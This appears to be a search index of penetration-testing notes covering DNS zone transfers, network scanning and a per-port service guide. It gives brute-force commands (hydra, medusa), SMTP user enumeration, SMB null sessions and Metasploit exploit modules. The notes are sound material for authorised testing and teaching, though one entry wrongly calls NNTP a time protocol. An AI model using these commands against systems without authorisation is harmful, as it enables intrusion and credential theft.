a Zone file which it uses to replicate the map of a domain. They should be configured so that only the replicating DNS-server can access it, but sometimes it is misconfigured so anyone can request the zone file, and thereby recieve the whole list of subdomains. This can be done the following way: To do this we first need to figure out which DNS-servers a domain has. host -t ns wikipedia.com host -l wikipedia.com ns1.wikipedia.com This can also be done with tools such as dnsrecon and dnsenum. https://security.stackexchange.com/questions/10452/dns-zone-transfer-attack","title":"DNS Zone Transfer Attack"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/","text":"Fr\u00e5gor: - Ska man k\u00f6ra med -Pn flaggan p\u00e5 nmap? Det kan v\u00e4l ta galet l\u00e5ng tid d\u00e5. Scanning # Configure your setup - route external machine # If it is the case that you have for example Nessus or some other tool on an external machine, but you do not want to connect it straight into your network, you can route the nessus machine through your pentest machine that is connected to the network. What you will basically do here is make your pentest machine into a router. And then connect your external machine to it, and route the traffic through through your router. Connect external machine via ethernet to your pentest machine. Give external machine ip. ip a add 192.168.150.2/24 dev eth0 Bring the interface up again ip link set eth0 up Add routing rules ip r add 10.0.0.0/16 via 192.168.150.1 dev eth0 Configure your MITM/forwarding machine ip a add 192.168.150.1/24 dev eth1 iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE echo 1 > /proc/sys/net/ipv4/ip_forward Using MSF # One good idea is to scan the network in metasploit. This will allow you to search its database. This will be necessary if the network is big. https://www.offensive-security.com/metasploit-unleashed/using-databases/ msfconsole db_nmap ## List hosts and ports services ## List hosts hosts ## Import nmap file db_import /path/to/file ## Export to CSV file services -o file.csv Scan safely # Nmap should not crash applications. It does not send malformed packets. If an application crashes it is because it is badly written. If they do crash the vendor should be alerted and the problem fixed. Use SYN scan (-sS) instead of connect scan (-sT). User-mode applications such as web servers can rarely even detect the former because it is all handled in kernel space and thus the services have no excuse to crash. Version scanning (-sV) and some of our NSE scripts (-sC or --script) risk crashing poorly written applications. Similarly, some buggy operating systems have been reported to crash when OS fingerprinted (-O). Omit these options for particularly sensitive environments or where you do not need the results. Using -T2 or slower (-T1, -T0) timing modes can reduce the chances that a port scan will harm a system, though they slow your scan dramatically. Older Linux boxes had an identd daemon that would block services temporarily if they were accessed too frequently. This could happen in a port scan, as well as during legitimate high-load situations. Slower timing might help here. These slow timing modes should only be used as a last resort because they can slow scans by an order of magnitude or more. Limit the number of ports and machines scanned to the fewest that are required. Every machine scanned has a minuscule chance of crashing, and so cutting the number of machines down improves your odds. Reducing the number of ports scanned reduces the risks to end hosts as well as network devices. Many NAT/firewall devices keep a state entry for every port probe. Most of them expire old entries when the table fills up, but occasional (pathetic) implementations crash instead. Reducing the ports and hosts scanned reduces the number of state entries and thus might help those fragile and defective devices stay up. Discover network # The first thing you need to do is to get to know the network a bit. I usually try to inspect the network traffic a little bit before doing anything. NOTICE, that you will perform a DORA (dicovery, offer, request, ack) over DHCP. Iptables will thus NOT block dhcp-requests. I configure iptables to drop all traffic, to make sure I don't interact with it in any way. iptables -P INPUT DROP iptables -P OUTPUT DROP iptables -P FORWARD DROP ip6tables -P INPUT DROP ip6tables -P OUTPUT DROP ip6tables -P FORWARD DROP NOTICE that when you run wireshark you will see your outgoing traffic even through iptables is droppping it. That is because wireshark is hooked up to the interface before iptables. So you will also see incoming traffic even though iptables drops it. Just connect your machine to the ethernet or wifi, then check what ip-address and netmask you get. ip a wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000 inet 10.10.1.10/24 brd 10.10.1.255 scope global dynamic wlan0 In this example you get a netmask of /24 (255.255.255.0). You can easily see the network range, broadcast address and how many hosts by using sipcalc sipcalc eth0 Discover hosts # Discovering hosts is fundamental. It is not impossible that the network you are on is a /8. That would be 16 million addresses. So we can't send a SYN packet to each port on all those 16 million hosts. That would take forever. In NMAP host discovery actions are called PING SCANS, although they are much more than simple ICMP Pings. The challenge in discovering hosts is that you don't have all the time in the world. So you need to balance between time and result. More time gives you better result (if you port scan each port on all machines for example). You might not have the possibility to scan everything, because the network might be too big. Then you need to first identify all hosts, and then scan those. Disable jost discovery # You can disable host discovery, or ping scans with this flag -Pn If the flag is included nmap will send packets to each host and port no matter what. Independet of if it doesn't exist. This might sometimes be useful if the host is not responding to any of the ping scan techniques, but is in fact open and exposes a port. If you want to be 100% sure that you are not missing any hosts this option might be useful. Exclude hosts # If you have some really critical systems that you don't want to scan. ANd you don't want to get blamed if they go down, you can add an exclude-list --exclude, --excludefile <filename> Another good idea is simply to drop all packets to those IP:s from your iptables rules. Remember to take a tcpdump of all the traffic, this way you can prove that it wasn't you. Perform a dry run # To make sure that you haev added all the target flags correctly, you can always perform a dry run. Nmap will only make reverse DNS resolutions, but not packets are sent to the hosts. For example: nmap -sL 10.0.0.1/25 Discover hosts # Okay, not lets get down to it. Very stealthy - Perform a simple reverse DNS resolution nmap -sL 10.0.0.1/24 This will make a DNS reverse resolution. This is an easy way to discover some hosts through the DNS. Less stealthy - Ping sweep The -sn flag will disable the port scan. It perform a icmp ping, TCP SYN to 443 and TCP ACK to 80, and an ARP scan. nmap -sn 10.0.0.1/24 This is actually a relly good, kind of stealthy command, but still useful. It is equivalent to doing this: nmap -PE -PS443 -PA80 -PP -PE 10.0.0.1/24 Basically, the possibilities you haev to discover a host are the following: - ARP broadcast - ICMP PING - TCP SYN to specified port (80/443) - TCP ACK to specified port (80/443) - UDP PING THe difference an attacker can make i to change the TCP and UDP ports. IP Protocol PING Discover services (ports) # Terminology # Nmap defines the state of a port according to the following: open An application is actively accepting TCP connections or UDP packets on this port. Finding these is often the primary goal of port scanning. Security-minded people know that each open port is an avenue for attack. Attackers and pen-testers want to exploit the open ports, while administrators try to close or protect them with firewalls without thwarting legitimate users. Open ports are also interesting for non-security scans because they show services available for use on the network. Before you get too excited about an open port, note that it is possible that the application is protected with a TCP wrapper (tcpd) or that the application itself is configured to only service approved client IP addresses. Such cases still leave more attack surface than a closed port. closed A closed port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it. They can be helpful in showing that a host is online and using an IP address (host discovery, or ping scanning), and as part of OS detection. Because closed ports are reachable, they may be worth scanning later in case some open up. Administrators may want to consider blocking such ports with a firewall so they appear in the filtered state, discussed next. filtered Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. The filtering could be from a dedicated firewall device, router rules, or host-based firewall software. These ports frustrate attackers because they provide so little information. Sometimes they respond with ICMP error messages such as type 3 code 13 (destination unreachable: communication administratively prohibited), but filters that simply drop probes without responding are far more common. This forces Nmap to retry several times just in case the probe was dropped due to network congestion rather than filtering. This sort of filtering slows scans down dramatically. unfiltered The unfiltered state means that a port is accessible, but Nmap is unable to determine whether it is open or closed. Only the ACK scan, which is used to map firewall rulesets, classifies ports into this state. Scanning unfiltered ports with other scan types such as Window scan, SYN scan, or FIN scan, may help resolve whether the port is open. open|filtered Nmap places ports in this state when it is unable to determine whether a port is open or filtered. This occurs for scan types in which open ports give no response. The lack of response could also mean that a packet filter dropped the probe or any response it elicited. So Nmap does not know for sure whether the port is open or being filtered. The UDP, IP protocol, FIN, NULL, and Xmas scans classify ports this way. closed|filtered Port scanning # In order to decrease the traffic perform a host-discovery first. It will decrease the traffic but it will also increase the risk that db_nmap -iL Test network segmentation # Network segmentation is the act of splitting networks into different segmentation. Segmenting the network can server different purposes, for example as a security measure to create strict walls between groups of servers/computers. Segmenting the network can limit the damage from an attack. If the attacker only access for example the client network, and not the servers. It will be more difficult for the attacker to reach critical data. Reasons why network segmentation is a good idea. Improved Security. Network traffic can be isolated and / or filtered to limit and / or prevent access between network segments. Better Access Control. Allow users to only access specific network resources. Improved Monitoring. Provides an opportunity to log events, monitor allowed and denied internal connections, and detect suspicious behavior. Improved Performance. With fewer hosts per subnet, local traffic is minimized. Broadcast traffic can be isolated to the local subnet. Better Containment. When a network issue occurs, its effect is limited to the local subnet. Test # The easy way to test network segmentation is simply to access one segment. Ask someone with knowledge of the network for a host and port on another network segment, and the simply try to connect to that host. Try an ICMP connect SYN Test for VLAN-hopping. Vulnerability scanning # Most of the time you will want to do a vulnerability scan of the network. A vulnerability scan will be more intrusive and send more aggressive payloads, than a simple nmap scan. PORTS TO NOT SCAN: 9100, 515, 3396, 9303. These are ports used for printers, and can cause some kaoz. Taken from lsit here by searhing for printers: [https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers][Printer ports] Nessus # Openvas # Create a target Click on \"Configuration\" and then on the little start (*) on the left. If you hover over it it says \"New Target\". Configure the target. Add the range and other settings. Configure scanning task Go to Scans / Tasks. Then click on the little star to the left. If you hover over it is says \"Create new task\". In scan config you can set it to Full and fast. It all depends on how much time you have. Basic test - Non-intrusive - Passive - TCPDump # The easiest test is simply to run tcpdump or wireshark while you are on the network and observe the traffic. Identify routes #","title":"Scanning Networks"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#scanning","text":"","title":"Scanning"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#configure-your-setup-route-external-machine","text":"If it is the case that you have for example Nessus or some other tool on an external machine, but you do not want to connect it straight into your network, you can route the nessus machine through your pentest machine that is connected to the network. What you will basically do here is make your pentest machine into a router. And then connect your external machine to it, and route the traffic through through your router. Connect external machine via ethernet to your pentest machine. Give external machine ip. ip a add 192.168.150.2/24 dev eth0 Bring the interface up again ip link set eth0 up Add routing rules ip r add 10.0.0.0/16 via 192.168.150.1 dev eth0 Configure your MITM/forwarding machine ip a add 192.168.150.1/24 dev eth1 iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE echo 1 > /proc/sys/net/ipv4/ip_forward","title":"Configure your setup - route external machine"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#using-msf","text":"One good idea is to scan the network in metasploit. This will allow you to search its database. This will be necessary if the network is big. https://www.offensive-security.com/metasploit-unleashed/using-databases/ msfconsole db_nmap ## List hosts and ports services ## List hosts hosts ## Import nmap file db_import /path/to/file ## Export to CSV file services -o file.csv","title":"Using MSF"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#scan-safely","text":"Nmap should not crash applications. It does not send malformed packets. If an application crashes it is because it is badly written. If they do crash the vendor should be alerted and the problem fixed. Use SYN scan (-sS) instead of connect scan (-sT). User-mode applications such as web servers can rarely even detect the former because it is all handled in kernel space and thus the services have no excuse to crash. Version scanning (-sV) and some of our NSE scripts (-sC or --script) risk crashing poorly written applications. Similarly, some buggy operating systems have been reported to crash when OS fingerprinted (-O). Omit these options for particularly sensitive environments or where you do not need the results. Using -T2 or slower (-T1, -T0) timing modes can reduce the chances that a port scan will harm a system, though they slow your scan dramatically. Older Linux boxes had an identd daemon that would block services temporarily if they were accessed too frequently. This could happen in a port scan, as well as during legitimate high-load situations. Slower timing might help here. These slow timing modes should only be used as a last resort because they can slow scans by an order of magnitude or more. Limit the number of ports and machines scanned to the fewest that are required. Every machine scanned has a minuscule chance of crashing, and so cutting the number of machines down improves your odds. Reducing the number of ports scanned reduces the risks to end hosts as well as network devices. Many NAT/firewall devices keep a state entry for every port probe. Most of them expire old entries when the table fills up, but occasional (pathetic) implementations crash instead. Reducing the ports and hosts scanned reduces the number of state entries and thus might help those fragile and defective devices stay up.","title":"Scan safely"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#discover-network","text":"The first thing you need to do is to get to know the network a bit. I usually try to inspect the network traffic a little bit before doing anything. NOTICE, that you will perform a DORA (dicovery, offer, request, ack) over DHCP. Iptables will thus NOT block dhcp-requests. I configure iptables to drop all traffic, to make sure I don't interact with it in any way. iptables -P INPUT DROP iptables -P OUTPUT DROP iptables -P FORWARD DROP ip6tables -P INPUT DROP ip6tables -P OUTPUT DROP ip6tables -P FORWARD DROP NOTICE that when you run wireshark you will see your outgoing traffic even through iptables is droppping it. That is because wireshark is hooked up to the interface before iptables. So you will also see incoming traffic even though iptables drops it. Just connect your machine to the ethernet or wifi, then check what ip-address and netmask you get. ip a wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000 inet 10.10.1.10/24 brd 10.10.1.255 scope global dynamic wlan0 In this example you get a netmask of /24 (255.255.255.0). You can easily see the network range, broadcast address and how many hosts by using sipcalc sipcalc eth0","title":"Discover network"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#discover-hosts","text":"Discovering hosts is fundamental. It is not impossible that the network you are on is a /8. That would be 16 million addresses. So we can't send a SYN packet to each port on all those 16 million hosts. That would take forever. In NMAP host discovery actions are called PING SCANS, although they are much more than simple ICMP Pings. The challenge in discovering hosts is that you don't have all the time in the world. So you need to balance between time and result. More time gives you better result (if you port scan each port on all machines for example). You might not have the possibility to scan everything, because the network might be too big. Then you need to first identify all hosts, and then scan those.","title":"Discover hosts"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#disable-jost-discovery","text":"You can disable host discovery, or ping scans with this flag -Pn If the flag is included nmap will send packets to each host and port no matter what. Independet of if it doesn't exist. This might sometimes be useful if the host is not responding to any of the ping scan techniques, but is in fact open and exposes a port. If you want to be 100% sure that you are not missing any hosts this option might be useful.","title":"Disable jost discovery"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#exclude-hosts","text":"If you have some really critical systems that you don't want to scan. ANd you don't want to get blamed if they go down, you can add an exclude-list --exclude, --excludefile <filename> Another good idea is simply to drop all packets to those IP:s from your iptables rules. Remember to take a tcpdump of all the traffic, this way you can prove that it wasn't you.","title":"Exclude hosts"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#perform-a-dry-run","text":"To make sure that you haev added all the target flags correctly, you can always perform a dry run. Nmap will only make reverse DNS resolutions, but not packets are sent to the hosts. For example: nmap -sL 10.0.0.1/25","title":"Perform a dry run"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#discover-hosts_1","text":"Okay, not lets get down to it. Very stealthy - Perform a simple reverse DNS resolution nmap -sL 10.0.0.1/24 This will make a DNS reverse resolution. This is an easy way to discover some hosts through the DNS. Less stealthy - Ping sweep The -sn flag will disable the port scan. It perform a icmp ping, TCP SYN to 443 and TCP ACK to 80, and an ARP scan. nmap -sn 10.0.0.1/24 This is actually a relly good, kind of stealthy command, but still useful. It is equivalent to doing this: nmap -PE -PS443 -PA80 -PP -PE 10.0.0.1/24 Basically, the possibilities you haev to discover a host are the following: - ARP broadcast - ICMP PING - TCP SYN to specified port (80/443) - TCP ACK to specified port (80/443) - UDP PING THe difference an attacker can make i to change the TCP and UDP ports. IP Protocol PING","title":"Discover hosts"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#discover-services-ports","text":"","title":"Discover services (ports)"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#terminology","text":"Nmap defines the state of a port according to the following: open An application is actively accepting TCP connections or UDP packets on this port. Finding these is often the primary goal of port scanning. Security-minded people know that each open port is an avenue for attack. Attackers and pen-testers want to exploit the open ports, while administrators try to close or protect them with firewalls without thwarting legitimate users. Open ports are also interesting for non-security scans because they show services available for use on the network. Before you get too excited about an open port, note that it is possible that the application is protected with a TCP wrapper (tcpd) or that the application itself is configured to only service approved client IP addresses. Such cases still leave more attack surface than a closed port. closed A closed port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it. They can be helpful in showing that a host is online and using an IP address (host discovery, or ping scanning), and as part of OS detection. Because closed ports are reachable, they may be worth scanning later in case some open up. Administrators may want to consider blocking such ports with a firewall so they appear in the filtered state, discussed next. filtered Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. The filtering could be from a dedicated firewall device, router rules, or host-based firewall software. These ports frustrate attackers because they provide so little information. Sometimes they respond with ICMP error messages such as type 3 code 13 (destination unreachable: communication administratively prohibited), but filters that simply drop probes without responding are far more common. This forces Nmap to retry several times just in case the probe was dropped due to network congestion rather than filtering. This sort of filtering slows scans down dramatically. unfiltered The unfiltered state means that a port is accessible, but Nmap is unable to determine whether it is open or closed. Only the ACK scan, which is used to map firewall rulesets, classifies ports into this state. Scanning unfiltered ports with other scan types such as Window scan, SYN scan, or FIN scan, may help resolve whether the port is open. open|filtered Nmap places ports in this state when it is unable to determine whether a port is open or filtered. This occurs for scan types in which open ports give no response. The lack of response could also mean that a packet filter dropped the probe or any response it elicited. So Nmap does not know for sure whether the port is open or being filtered. The UDP, IP protocol, FIN, NULL, and Xmas scans classify ports this way. closed|filtered","title":"Terminology"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#port-scanning","text":"In order to decrease the traffic perform a host-discovery first. It will decrease the traffic but it will also increase the risk that db_nmap -iL","title":"Port scanning"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#test-network-segmentation","text":"Network segmentation is the act of splitting networks into different segmentation. Segmenting the network can server different purposes, for example as a security measure to create strict walls between groups of servers/computers. Segmenting the network can limit the damage from an attack. If the attacker only access for example the client network, and not the servers. It will be more difficult for the attacker to reach critical data. Reasons why network segmentation is a good idea. Improved Security. Network traffic can be isolated and / or filtered to limit and / or prevent access between network segments. Better Access Control. Allow users to only access specific network resources. Improved Monitoring. Provides an opportunity to log events, monitor allowed and denied internal connections, and detect suspicious behavior. Improved Performance. With fewer hosts per subnet, local traffic is minimized. Broadcast traffic can be isolated to the local subnet. Better Containment. When a network issue occurs, its effect is limited to the local subnet.","title":"Test network segmentation"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#test","text":"The easy way to test network segmentation is simply to access one segment. Ask someone with knowledge of the network for a host and port on another network segment, and the simply try to connect to that host. Try an ICMP connect SYN Test for VLAN-hopping.","title":"Test"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#vulnerability-scanning","text":"Most of the time you will want to do a vulnerability scan of the network. A vulnerability scan will be more intrusive and send more aggressive payloads, than a simple nmap scan. PORTS TO NOT SCAN: 9100, 515, 3396, 9303. These are ports used for printers, and can cause some kaoz. Taken from lsit here by searhing for printers: [https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers][Printer ports]","title":"Vulnerability scanning"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#nessus","text":"","title":"Nessus"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#openvas","text":"Create a target Click on \"Configuration\" and then on the little start (*) on the left. If you hover over it it says \"New Target\". Configure the target. Add the range and other settings. Configure scanning task Go to Scans / Tasks. Then click on the little star to the left. If you hover over it is says \"Create new task\". In scan config you can set it to Full and fast. It all depends on how much time you have.","title":"Openvas"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#basic-test-non-intrusive-passive-tcpdump","text":"The easiest test is simply to run tcpdump or wireshark while you are on the network and observe the traffic.","title":"Basic test - Non-intrusive - Passive - TCPDump"},{"location":"attacking_internal_network/infrastructure_pentest_scanning_networks/#identify-routes","text":"","title":"Identify routes"},{"location":"attacking_internal_network/list_of_common_ports/","text":"Common ports/services and how to use them # Port X - Service unknown # If you have a port open with unkown service you can do this to find out which service it might be. nmap -d 192.168.19.244 8000 Port 21 - FTP # Connect to the ftp-server to enumerate software and version ftp 192.168.1.101 nc 192.168.1.101 21 Many ftp-servers allow anonymous users. These might be misconfigured and give too much access, and it might also be necessary for certain exploits to work. So always try to log in with anonymous:anonymous . Remember the binary and ascii mode! If you upload a binary file you have to put the ftp-server in binary mode, otherwise the file will become corrupted and you will not be able to use it! The same for text-files. Use ascii mode for them! You just write binary and ascii to switch mode. Port 22 - SSH # SSH is such an old and fundamental technology so most modern version are quite hardened. You can find out the version of the SSH either but scanning it with nmap or by connecting with it using nc . nc 192.168.1.10 22 It returnes something like this: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu1 This banner is defined in RFC4253, in chapter 4.2 Protocol Version Exchange. http://www.openssh.com/txt/rfc4253.txt The protocol-version string should be defined like this: SSH-protoversion-softwareversion SP comments CR LF Where comments is optional. And SP means space, and CR (carriege return) and LF (Line feed) So basically the comments should be separated by a space. Port 23 - Telnet # Telnet is considered insecure mainly because it does not encrypt its traffic. Also a quick search in exploit-db will show that there are various RCE-vulnerabilities on different versions. Might be worth checking out. Brute force it You can also brute force it like this: hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet Port 25 - SMTP # SMTP is a server to server service. The user receives or sends emails using IMAP or POP3. Those messages are then routed to the SMTP-server which communicates the email to another server. The SMTP-server has a database with all emails that can receive or send emails. We can use SMTP to query that database for possible email-addresses. Notice that we cannot retrieve any emails from SMTP. We can only send emails. Here are the possible commands HELO - EHLO - Extended SMTP. STARTTLS - SMTP communicted over unencrypted protocol. By starting TLS-session we encrypt the traffic. RCPT - Address of the recipient. DATA - Starts the transfer of the message contents. RSET - Used to abort the current email transaction. MAIL - Specifies the email address of the sender. QUIT - Closes the connection. HELP - Asks for the help screen. AUTH - Used to authenticate the client to the server. VRFY - Asks the server to verify is the email user's mailbox exists. Manually # We can use this service to find out which usernames are in the database. This can be done in the following way. nc 192.168.1.103 25 220 metasploitable.localdomain ESMTP Postfix (Ubuntu) VRFY root 252 2.0.0 root VRFY roooooot 550 5.1.1 <roooooot>: Recipient address rejected: User unknown in local recipient table Here we have managed to identify the user root . But roooooot was rejected. VRFY , EXPN and RCPT can be used to identify users. Telnet is a bit more friendly some times. So always use that too telnet 10.11.1.229 25 Automatized # This process can of course be automatized Check for commands nmap -script smtp-commands.nse 192.168.1.101 smtp-user-enum # The command will look like this. -M for mode. -U for userlist. -t for target smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 192.168.1.103 Mode ..................... VRFY Worker Processes ......... 5 Usernames file ........... /root/sectools/SecLists/Usernames/Names/names.txt Target count ............. 1 Username count ........... 8607 Target TCP port .......... 25 Query timeout ............ 5 secs Target domain ............ ######## Scan started at Sun Jun 19 11:04:59 2016 ######### 192.168.1.103: Bin exists 192.168.1.103: Irc exists 192.168.1.103: Mail exists 192.168.1.103: Man exists 192.168.1.103: Sys exists ######## Scan completed at Sun Jun 19 11:06:51 2016 ######### 5 results. 8607 queries in 112 seconds (76.8 queries / sec) Metasploit # I can also be done using metasploit msf > use auxiliary/scanner/smtp/smtp_enum msf auxiliary(smtp_enum) > show options Module options (auxiliary/scanner/smtp/smtp_enum): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 25 yes The target port THREADS 1 yes The number of concurrent threads UNIXONLY true yes Skip Microsoft bannered servers when testing unix users USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt yes The file that contains a list of probable users accounts. Here are the documentations for SMTP https://cr.yp.to/smtp/vrfy.html http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/ http://www.dummies.com/how-to/content/smtp-hacks-and-how-to-guard-against-them.html http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/ Port 69 - TFTP # This is a ftp-server but it is using UDP. Port 80 - HTTP # Info about web-vulnerabilities can be found in the next chapter HTTP - Web Vulnerabilities . We usually just think of vulnerabilities on the http-interface, the web page, when we think of port 80. But with .htaccess we are able to password protect certain directories. If that is the case we can brute force that the following way. Password protect directory with htaccess # Step 1 Create a directory that you want to password-protect. Create .htaccess tile inside that directory. Content of .htaccess: AuthType Basic AuthName \"Password Protected Area\" AuthUserFile /var/www/html/test/.htpasswd Require valid-user Create .htpasswd file htpasswd -cb .htpasswd test admin service apache2 restart This will now create a file called .htpasswd with the user: test and the password: admin If the directory does not display a login-prompt, you might have to change the apache2.conf file. To this: <Directory /var/www/html/test> AllowOverride AuthConfig </Directory> Brute force it # Now that we know how this works we can try to brute force it with medusa. medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10 Port 88 - Kerberos # Kerberos is a protocol that is used for network authentication. Different versions are used by *nix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller. If you already have a login to a user of that domain you might be able to escalate that privilege. Check out: MS14-068 Port 110 - Pop3 # This service is used for fetching emails on a email server. So the server that has this port open is probably an email-server, and other clients on the network (or outside) access this server to fetch their emails. telnet 192.168.1.105 110 USER pelle@192.168.1.105 PASS admin # List all emails list # Retrive email number 5, for example retr 5 Port 111 - Rpcbind # RFC: 1833 Rpcbind can help us look for NFS-shares. So look out for nfs. Obtain list of services running with RPC: rpcbind -p 192.168.1.101 Port 119 - NNTP # Network time protocol. It is used synchronize time. If a machine is running this server it might work as a server for synchronizing time. So other machines query this machine for the exact time. An attacker could use this to change the time. Which might cause denial of service and all around havoc. Port 135 - MSRPC # This is the windows rpc-port. https://en.wikipedia.org/wiki/Microsoft_RPC Enumerate # nmap 192.168.0.101 --script=msrpc-enum msf > use exploit/windows/dcerpc/ms03_026_dcom Port 139 and 445- SMB/Samba shares # Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server. Connecting # For linux-users you can log in to the smb-share using smbclient, like this: smbclient -L 192.168.1.102 smbclient //192.168.1.106/tmp smbclient \\\\\\\\192.168.1.105\\\\ipc$ -U john smbclient //192.168.1.105/ipc$ -U john If you don't provide any password, just click enter, the server might show you the different shares and version of the server. This can be useful information for looking for exploits. There are tons of exploits for smb. So smb, for a linux-user, is pretty much like and ftp or a nfs. Here is a good guide for how to configure samba: https://help.ubuntu.com/community/How%20to%20Create%20a%20Network%20Share%20Via%20Samba%20Via%20CLI%20(Command-line%20interface/Linux%20Terminal)%20-%20Uncomplicated,%20Simple%20and%20Brief%20Way! mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 \"//10.10.10.10/My Share\" /mnt/cifs Connectin with PSExec # If you have credentials you can use psexec you easily log in. You can either use the standalone binary or the metasploit module. use exploit/windows/smb/psexec Scanning with nmap # Scanning for smb with Nmap nmap -p 139,445 192.168.1.1/24 There are several NSE scripts that can be useful, for example: ls -l /usr/share/nmap/scripts/smb* -rw-r--r-- 1 root root 45K Jan 24 2016 /usr/share/nmap/scripts/smb-brute.nse -rw-r--r-- 1 root root 4.8K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-domains.nse -rw-r--r-- 1 root root 5.8K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-groups.nse -rw-r--r-- 1 root root 7.9K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-processes.nse -rw-r--r-- 1 root root 12K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-sessions.nse -rw-r--r-- 1 root root 6.8K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-shares.nse -rw-r--r-- 1 root root 13K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-users.nse -rw-r--r-- 1 root root 1.7K Jan 24 2016 /usr/share/nmap/scripts/smb-flood.nse -rw-r--r-- 1 root root 7.3K Jan 24 2016 /usr/share/nmap/scripts/smb-ls.nse -rw-r--r-- 1 root root 8.6K Jan 24 2016 /usr/share/nmap/scripts/smb-mbenum.nse -rw-r--r-- 1 root root 7.0K Jan 24 2016 /usr/share/nmap/scripts/smb-os-discovery.nse -rw-r--r-- 1 root root 5.0K Jan 24 2016 /usr/share/nmap/scripts/smb-print-text.nse -rw-r--r-- 1 root root 63K Jan 24 2016 /usr/share/nmap/scripts/smb-psexec.nse -rw-r--r-- 1 root root 5.0K Jan 24 2016 /usr/share/nmap/scripts/smb-security-mode.nse -rw-r--r-- 1 root root 2.4K Jan 24 2016 /usr/share/nmap/scripts/smb-server-stats.nse -rw-r--r-- 1 root root 14K Jan 24 2016 /usr/share/nmap/scripts/smb-system-info.nse -rw-r--r-- 1 root root 1.5K Jan 24 2016 /usr/share/nmap/scripts/smbv2-enabled.nse -rw-r--r-- 1 root root 7.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-conficker.nse -rw-r--r-- 1 root root 6.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse -rw-r--r-- 1 root root 6.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms06-025.nse -rw-r--r-- 1 root root 5.4K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms07-029.nse -rw-r--r-- 1 root root 5.7K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms08-067.nse -rw-r--r-- 1 root root 5.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms10-054.nse -rw-r--r-- 1 root root 7.2K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms10-061.nse -rw-r--r-- 1 root root 4.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse nbtscan # nbtscan -r 192.168.1.1/24 It can be a bit buggy sometimes so run it several times to make sure it found all users. Enum4linux # Enum4linux can be used to enumerate windows and linux machines with smb-shares. The do all option: enum4linux -a 192.168.1.120 For info about it ere: https://labs.portcullis.co.uk/tools/enum4linux/ rpcclient # You can also use rpcclient to enumerate the share. Connect with a null-session. That is, without a user. This only works for older windows servers. rpcclient -U \"\" 192.168.1.101 Once connected you could enter commands like srvinfo enumdomusers getdompwinfo querydominfo netshareenum netshareenumall Port 143/993 - IMAP # IMAP lets you access email stored on that server. So imagine that you are on a network at work, the emails you recieve is not stored on your computer but on a specific mail-server. So every time you look in your inbox your email-client (like outlook) fetches the emails from the mail-server using imap. IMAP is a lot like pop3. But with IMAP you can access your email from various devices. With pop3 you can only access them from one device. Port 993 is the secure port for IMAP. Port 161 and 162 - SNMP # Simple Network Management Protocol SNMP protocols 1,2 and 2c does not encrypt its traffic. So it can be intercepted to steal credentials. SNMP is used to manage devices on a network. It has some funny terminology. For example, instead of using the word password the word community is used instead. But it is kind of the same thing. A common community-string/password is public. You can have read-only access to the snmp.Often just with 